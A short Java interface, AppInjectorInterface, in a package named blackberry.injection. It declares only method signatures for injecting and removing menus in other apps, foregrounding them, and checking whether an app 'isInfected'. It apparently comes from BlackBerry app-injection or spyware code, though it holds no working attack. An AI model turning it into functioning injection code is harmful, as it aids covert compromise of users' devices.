package blackberry.injection;

public interface AppInjectorInterface {

    boolean requestForeground();

    boolean injectMenu();

    boolean deleteMenu();

    boolean callMenuByKey();

    String getAppName();

    void callMenuInContext();

    boolean isInfected();

}
